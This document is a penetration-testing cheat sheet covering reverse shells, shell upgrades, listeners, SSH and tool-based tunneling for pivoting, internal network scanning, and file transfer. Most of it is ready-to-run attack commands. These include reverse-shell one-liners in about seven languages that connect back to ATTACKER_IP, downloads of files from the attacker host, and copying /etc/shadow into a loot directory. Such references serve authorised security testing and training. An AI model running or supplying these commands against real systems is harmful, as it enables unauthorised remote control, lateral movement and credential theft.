# Reverse Shells, Tunneling & Pivoting

Quick reference for establishing reverse shells, pivoting through compromised hosts, and
transferring files during engagements.

---

## Reverse Shell One-Liners

### Bash

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# If /dev/tcp not available (some distros)
bash -c 'exec 5<>/dev/tcp/ATTACKER_IP/4444; cat <&5 | while read line; do $line 2>&5 >&5; done'
```

### Python

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# If python3 not found, try python or python2
```

### Perl

```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
```

### Netcat

```bash
# Traditional (if -e flag supported)
nc -e /bin/bash ATTACKER_IP 4444

# Without -e (POSIX-compatible)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f

# ncat (nmap's netcat) with SSL
ncat --ssl ATTACKER_IP 4444 -e /bin/bash
```

### PHP

```bash
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# If exec is disabled, try:
php -r '$sock=fsockopen("ATTACKER_IP",4444);$p=proc_open("/bin/bash",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```

### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
```

### Node.js

```bash
# Use require("child_" + "process") to spawn /bin/bash connecting back to ATTACKER_IP:4444
# See: https://www.revshells.com for ready-to-paste Node.js payloads
```

### Lua

```bash
lua -e "require('socket');require('os');t=socket.tcp();t:connect('ATTACKER_IP','4444');os.execute('/bin/bash -i <&3 >&3 2>&3');"
```

---

## Shell Upgrade (TTY)

Raw reverse shells lack job control, tab completion, and proper terminal handling. Upgrade:

```bash
# Step 1: Spawn PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Or: script /dev/null -c bash
# Or: /usr/bin/script -qc /bin/bash /dev/null

# Step 2: Background the shell
# Press Ctrl+Z

# Step 3: On attacker machine
stty raw -echo; fg
# Press Enter twice

# Step 4: Set terminal type
export TERM=xterm-256color
export SHELL=bash
stty rows 50 columns 200  # match your terminal size
```

---

## Listener Setup (Attacker Side)

```bash
# Basic netcat listener
nc -lvnp 4444

# ncat with SSL (encrypted)
ncat --ssl -lvnp 4444

# rlwrap for readline support (arrow keys, history)
rlwrap nc -lvnp 4444

# socat (full TTY from the start)
socat file:`tty`,raw,echo=0 tcp-listen:4444
# Corresponding reverse shell:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

---

## SSH Tunneling

### Local Port Forwarding (-L)

Access a remote service through the pivot host.

```bash
# Access internal_host:3306 via localhost:3306
ssh -L 3306:internal_host:3306 user@pivot -N

# Access service only listening on pivot's localhost
ssh -L 8080:127.0.0.1:8080 user@pivot -N
```

### Remote Port Forwarding (-R)

Expose your local service on the pivot host.

```bash
# Make your local port 8000 accessible on pivot:8000
ssh -R 8000:127.0.0.1:8000 user@pivot -N

# Useful for serving exploits/tools to internal network
```

### Dynamic SOCKS Proxy (-D)

Route arbitrary traffic through the pivot.

```bash
ssh -D 1080 user@pivot -N

# Use with proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains nmap -sT -Pn internal_network/24
proxychains curl http://internal-app:8080
```

### ProxyJump / Multi-Hop

```bash
# Jump through multiple hosts
ssh -J user@pivot1,user@pivot2 user@final_target

# Equivalent with ProxyCommand (older SSH)
ssh -o ProxyCommand="ssh -W %h:%p user@pivot1" user@final_target
```

---

## Tunneling Tools

### chisel (TCP/UDP over HTTP)

```bash
# Attacker (server)
chisel server --reverse --port 8080

# Target (client) -- reverse SOCKS proxy
chisel client ATTACKER_IP:8080 R:socks

# Target (client) -- forward specific port
chisel client ATTACKER_IP:8080 R:3306:internal_db:3306
```

### ligolo-ng (TUN-based, more transparent)

```bash
# Attacker (proxy server)
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# Target (agent)
ligolo-agent -connect ATTACKER_IP:11601 -ignore-cert

# On attacker: add route to internal network
sudo ip route add 10.10.10.0/24 dev ligolo
```

### socat (Swiss army knife)

```bash
# Port forward
socat TCP-LISTEN:8080,fork TCP:internal_host:80

# Encrypted relay
socat OPENSSL-LISTEN:443,cert=cert.pem,fork TCP:internal_host:80
```

---

## Internal Network Scanning (No Nmap)

When nmap isn't available on the target:

```bash
# Bash TCP port scan (slow but works everywhere)
for port in 21 22 23 25 53 80 88 110 135 139 143 389 443 445 993 995 1433 1521 3306 3389 5432 5900 6379 8080 8443 9200; do
  (echo >/dev/tcp/TARGET_IP/$port) 2>/dev/null && echo "$port open"
done

# Subnet sweep for live hosts
for i in $(seq 1 254); do
  (ping -c 1 -W 1 10.10.10.$i > /dev/null 2>&1 && echo "10.10.10.$i alive") &
done; wait

# Using /dev/tcp for host discovery (no ping needed)
for i in $(seq 1 254); do
  (echo >/dev/tcp/10.10.10.$i/22) 2>/dev/null && echo "10.10.10.$i:22 open" &
done; wait
```

---

## File Transfer Methods

### HTTP (attacker serves files)

```bash
# On attacker
python3 -m http.server 8000
# or: php -S 0.0.0.0:8000

# On target
wget http://ATTACKER_IP:8000/file
curl http://ATTACKER_IP:8000/file -o file
```

### Netcat

```bash
# On attacker (send file)
nc -lvnp 9999 < file_to_send

# On target (receive file)
nc ATTACKER_IP 9999 > received_file
```

### Base64 (no network tools needed)

```bash
# On source: encode
base64 -w0 file_to_transfer
# Copy the output

# On target: decode
echo "BASE64_STRING" | base64 -d > file
```

### SCP / SFTP (if SSH is available)

```bash
# Upload to target
scp file user@target:/tmp/

# Download from target
scp user@target:/etc/shadow /tmp/loot/
```

### /dev/tcp (bash built-in, no external tools)

```bash
# On attacker: serve a file
{ echo -ne "HTTP/1.0 200 OK\r\n\r\n"; cat file; } | nc -lvnp 8000

# On target: download
exec 3<>/dev/tcp/ATTACKER_IP/8000
echo -e "GET /file HTTP/1.0\r\nHost: ATTACKER_IP\r\n\r\n" >&3
cat <&3 > received_file
```
